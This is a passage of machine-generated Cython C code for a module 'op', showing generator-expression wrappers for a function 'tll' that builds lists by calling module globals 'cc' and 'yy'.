*__pyx_self, CYTHON_UNUSED PyObject *unused); \nstatic PyMethodDef __pyx_mdef_2op_3tll = {"tll", (PyCFunction)__pyx_pw_2op_3tll, METH_NOARGS, 0};\nstatic PyObject *__pyx_pw_2op_3tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("tll (wrapper)", 0);\n  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);\n  __pyx_r = __pyx_pf_2op_2tll(__pyx_self);\n\n  \n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\nstatic PyObject *__pyx_gb_2op_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); \n\n\n\nstatic PyObject *__pyx_pf_2op_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0) {\n  struct __pyx_obj_2op___pyx_scope_struct__genexpr *__pyx_cur_scope;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  __pyx_cur_scope = (struct __pyx_obj_2op___pyx_scope_struct__genexpr *)__pyx_tp_new_2op___pyx_scope_struct__genexpr(__pyx_mstate_global->__pyx_ptype_2op___pyx_scope_struct__genexpr, __pyx_mstate_global->__pyx_empty_tuple, NULL);\n  if (unlikely(!__pyx_cur_scope)) {\n    __pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct__genexpr *)Py_None);\n    __Pyx_INCREF(Py_None);\n    __PYX_ERR(0, 113, __pyx_L1_error)\n  } else {\n    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);\n  }\n  __pyx_cur_scope->__pyx_genexpr_arg_0 = __pyx_genexpr_arg_0;\n  __Pyx_INCREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  {\n    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_2op_3tll_2generator, ((PyObject *)__pyx_mstate_global->__pyx_codeobj_tab[0]), (PyObject *) __pyx_cur_scope, __pyx_mstate_global->__pyx_n_u_genexpr, __pyx_mstate_global->__pyx_n_u_tll_locals_genexpr, __pyx_mstate_global->__pyx_n_u_op); if (unlikely(!gen)) __PYX_ERR(0, 113, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_cur_scope);\n    __Pyx_RefNannyFinishContext();\n    return (PyObject *) gen;\n  }\n\n  \n  __pyx_L1_error:;\n  __Pyx_AddTraceback("op.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __Pyx_DECREF((PyObject *)__pyx_cur_scope);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_gb_2op_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) \n{\n  struct __pyx_obj_2op___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct__genexpr *)__pyx_generator->closure);\n  PyObject *__pyx_r = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  Py_ssize_t __pyx_t_2;\n  PyObject *(*__pyx_t_3)(PyObject *);\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  size_t __pyx_t_8;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  switch (__pyx_generator->resume_label) {\n    case 0: goto __pyx_L3_first_run;\n    default: \n    __Pyx_RefNannyFinishContext();\n    return NULL;\n  }\n  __pyx_L3_first_run:;\n  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 113, __pyx_L1_error)\n  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 113, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_r);\n  if (unlikely(!__pyx_cur_scope->__pyx_genexpr_arg_0)) { __Pyx_RaiseUnboundLocalError(".0"); __PYX_ERR(0, 113, __pyx_L1_error) }\n  if (likely(PyList_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) || PyTuple_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) {\n    __pyx_t_1 = __pyx_cur_scope->__pyx_genexpr_arg_0; __Pyx_INCREF(__pyx_t_1);\n    __pyx_t_2 = 0;\n    __pyx_t_3 = NULL;\n  } else {\n    __pyx_t_2 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_cur_scope->__pyx_genexpr_arg_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 113, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 113, __pyx_L1_error)\n  }\n  for (;;) {\n    if (likely(!__pyx_t_3)) {\n      if (likely(PyList_CheckExact(__pyx_t_1))) {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 113, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        __pyx_t_4 = __Pyx_PyList_GetItemRef(__pyx_t_1, __pyx_t_2);\n        ++__pyx_t_2;\n      } else {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 113, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        __pyx_t_4 = __Pyx_NewRef(PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_2));\n        #else\n        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2);\n        #endif\n        ++__pyx_t_2;\n      }\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 113, __pyx_L1_error)\n    } else {\n      __pyx_t_4 = __pyx_t_3(__pyx_t_1);\n      if (unlikely(!__pyx_t_4)) {\n        PyObject* exc_type = PyErr_Occurred();\n        if (exc_type) {\n          if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) __PYX_ERR(0, 113, __pyx_L1_error)\n          PyErr_Clear();\n        }\n        break;\n      }\n    }\n    __Pyx_GOTREF(__pyx_t_4);\n    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);\n    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_4);\n    __Pyx_GIVEREF(__pyx_t_4);\n    __pyx_t_4 = 0;\n    __pyx_t_5 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_cc); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 113, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_yy); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 113, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n    __pyx_t_8 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_6))) {\n      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);\n      assert(__pyx_t_5);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n      __Pyx_INCREF(__pyx_t_5);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n      __pyx_t_8 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_7};\n      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_8, (2-__pyx_t_8) | (__pyx_t_8*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 113, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_4);\n    }\n    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 113, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  }\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);\n\n  \n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  if (__Pyx_PyErr_Occurred()) {\n    __Pyx_Generator_Replace_StopIteration(0);\n    __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  }\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  #if !CYTHON_USE_EXC_INFO_STACK\n  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);\n  #endif\n  __pyx_generator->resume_label = -1;\n  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\nstatic PyObject *__pyx_gb_2op_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); \n\n\n\nstatic PyObject *__pyx_pf_2op_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0) {\n  struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *__pyx_cur_scope;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  __pyx_cur_scope = (struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)__pyx_tp_new_2op___pyx_scope_struct_1_genexpr(__pyx_mstate_global->__pyx_ptype_2op___pyx_scope_struct_1_genexpr, __pyx_mstate_global->__pyx_empty_tuple, NULL);\n  if (unlikely(!__pyx_cur_scope)) {\n    __pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)Py_None);\n    __Pyx_INCREF(Py_None);\n    __PYX_ERR(0, 114, __pyx_L1_error)\n  } else {\n    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);\n  }\n  __pyx_cur_scope->__pyx_genexpr_arg_0 = __pyx_genexpr_arg_0;\n  __Pyx_INCREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  {\n    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_2op_3tll_5generator1, ((PyObject *)__pyx_mstate_global->__pyx_codeobj_tab[1]), (PyObject *) __pyx_cur_scope, __pyx_mstate_global->__pyx_n_u_genexpr, __pyx_mstate_global->__pyx_n_u_tll_locals_genexpr, __pyx_mstate_global->__pyx_n_u_op); if (unlikely(!gen)) __PYX_ERR(0, 114, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_cur_scope);\n    __Pyx_RefNannyFinishContext();\n    return (PyObject *) gen;\n  }\n\n  \n  __pyx_L1_error:;\n  __Pyx_AddTraceback("op.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __Pyx_DECREF((PyObject *)__pyx_cur_scope);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_gb_2op_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) \n{\n  struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);\n  PyObject *__pyx_r = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  Py_ssize_t __pyx_t_2;\n  PyObject *(*__pyx_t_3)(PyObject *);\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  size_t __pyx_t_8;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  switch (__pyx_generator->resume_label) {\n    case 0: goto __pyx_L3_first_run;\n    default: \n    __Pyx_RefNannyFinishContext();\n    return NULL;\n  }\n  __pyx_L3_first_run:;\n  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 114, __pyx_L1_error)\n  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 114, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_r);\n  if (unlikely(!__pyx_cur_scope->__pyx_genexpr_arg_0)) { __Pyx_RaiseUnboundLocalError(".0"); __PYX_ERR(0, 114, __pyx_L1_error) }\n  if (likely(PyList_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) || PyTuple_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) {\n    __pyx_t_1 = __pyx_cur_scope->__pyx_genexpr_arg_0; __Pyx_INCREF(__pyx_t_1);\n    __pyx_t_2 = 0;\n    __pyx_t_3 = NULL;\n  } else {\n    __pyx_t_2 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_cur_scope->__pyx_genexpr_arg_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 114, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 114, __pyx_L1_error)\n  }\n  for (;;) {\n    if (likely(!__pyx_t_3)) {\n      if (likely(PyList_CheckExact(__pyx_t_1))) {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 114, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        __pyx_t_4 = __Pyx_PyList_GetItemRef(__pyx_t_1, __pyx_t_2);\n        ++__pyx_t_2;\n      } else {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 114, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        __pyx_t_4 = __Pyx_NewRef(PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_2));\n        #else\n        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2);\n        #endif\n        ++__pyx_t_2;\n      }\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 114, __pyx_L1_error)\n    } else {\n      __pyx_t_4 = __pyx_t_3(__pyx_t_1);\n      if (unlikely(!__pyx_t_4)) {\n        PyObject* exc_type = PyErr_Occurred();\n        if (exc_type) {\n          if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) __PYX_ERR(0, 114, __pyx_L1_error)\n          PyErr_Clear();\n        }\n        break;\n      }\n    }\n    __Pyx_GOTREF(__pyx_t_4);\n    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);\n    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_4);\n    __Pyx_GIVEREF(__pyx_t_4);\n    __pyx_t_4 = 0;\n    __pyx_t_5 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_cc); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 114, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_yy); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 114, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n    __pyx_t_8 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_6))) {\n      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);\n      assert(__pyx_t_5);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n      __Pyx_INCREF(__pyx_t_5);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n      __pyx_t_8 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_7};\n      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_8, (2-__pyx_t_8) | (__pyx_t_8*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 114, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_4);\n    }\n    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 114, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  }\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);\n\n  \n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  if (__Pyx_PyErr_Occurred()) {\n    __Pyx_Generator_Replace_StopIteration(0);\n    __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  }\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  #if !CYTHON_USE_EXC_INFO_STACK\n  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);\n  #endif\n  __pyx_generator->resume_label = -1;\n  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\nstatic PyObject *__pyx_gb_2op_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); \n\n\n\nstatic PyObject *__pyx_pf_2op_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0) {\n  struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *__pyx_cur_scope;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  __pyx_cur_scope = (struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)__pyx_tp_new_2op___pyx_scope_struct_2_genexpr(__pyx_mstate_global->__pyx_ptype_2op___pyx_scope_struct_2_genexpr, __pyx_mstate_global->__pyx_empty_tuple, NULL);\n  if (unlikely(!__pyx_cur_scope)) {\n    __pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)Py_None);\n    __Pyx_INCREF(Py_None);\n    __PYX_ERR(0, 115, __pyx_L1_error)\n  } else {\n    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);\n  }\n  __pyx_cur_scope->__pyx_genexpr_arg_0 = __pyx_genexpr_arg_0;\n  __Pyx_INCREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_genexpr_arg_0);\n  {\n    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_2op_3tll_8generator2, ((PyObject *)__pyx_mstate_global->__pyx_codeobj_tab[2]), (PyObject *) __pyx_cur_scope, __pyx_mstate_global->__pyx_n_u_genexpr, __pyx_mstate_global->__pyx_n_u_tll_locals_genexpr, __pyx_mstate_global->__pyx_n_u_op); if (unlikely(!gen)) __PYX_ERR(0, 115, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_cur_scope);\n    __Pyx_RefNannyFinishContext();\n    return (PyObject *) gen;\n  }\n\n  \n  __pyx_L1_error:;\n  __Pyx_AddTraceback("op.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __Pyx_DECREF((PyObject *)__pyx_cur_scope);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_gb_2op_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) \n{\n  struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);\n  PyObject *__pyx_r = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  Py_ssize_t __pyx_t_2;\n  PyObject *(*__pyx_t_3)(PyObject *);\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  size_t __pyx_t_8;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  switch (__pyx_generator->resume_label) {\n    case 0: goto __pyx_L3_first_run;\n    default: \n    __Pyx_RefNannyFinishContext();\n    return NULL;\n  }\n  __pyx_L3_first_run:;\n  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 115, __pyx_L1_error)\n  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 115, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_r);\n  if (unlikely(!__pyx_cur_scope->__pyx_genexpr_arg_0)) { __Pyx_RaiseUnboundLocalError(".0"); __PYX_ERR(0, 115, __pyx_L1_error) }\n  if (likely(PyList_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) || PyTuple_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) {\n    __pyx_t_1 = __pyx_cur_scope->__pyx_genexpr_arg_0; __Pyx_INCREF(__pyx_t_1);\n    __pyx_t_2 = 0;\n    __pyx_t_3 = NULL;\n  } else {\n    __pyx_t_2 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_cur_scope->__pyx_genexpr_arg_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 115, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 115, __pyx_L1_error)\n  }\n  for (;;) {\n    if (likely(!__pyx_t_3)) {\n      if (likely(PyList_CheckExact(__pyx_t_1))) {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 115, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        __pyx_t_4 = __Pyx_PyList_GetItemRef(__pyx_t_1, __pyx_t_2);\n        ++__pyx_t_2;\n      } else {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 115, __pyx_L1_error)\n          #endif\n          if (__pyx_t_2 >= __pyx_temp) break;\n        }\n        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        __pyx_t_4 = __Pyx_NewRef(PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_2));\n        #else\n        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2);\n        #endif\n        ++__pyx_t_2;\n      }\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L1_error)\n    } else {\n      __pyx_t_4 = __pyx_t_3(__pyx_t_1);\n      if (unlikely(!__pyx_t_4)) {\n        PyObject* exc_type = PyErr_Occurred();\n        if (exc_type) {\n          if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) __PYX_ERR(0, 115, __pyx_L1_error)\n          PyErr_Clear();\n        }\n        break;\n      }\n    }\n    __Pyx_GOTREF(__pyx_t_4);\n    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);\n    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_4);\n    __Pyx_GIVEREF(__pyx_t_4);\n    __pyx_t_4 = 0;\n    __pyx_t_5 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_cc); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 115, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_yy); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 115, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n    __pyx_t_8 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_6))) {\n      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);\n      assert(__pyx_t_5);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n      __Pyx_INCREF(__pyx_t_5);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n      __pyx_t_8 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_7};\n      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_8, (2-__pyx_t_8) | (__pyx_t_8*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_4);\n    }\n    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 115, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  }\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);\n\n  \n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  if 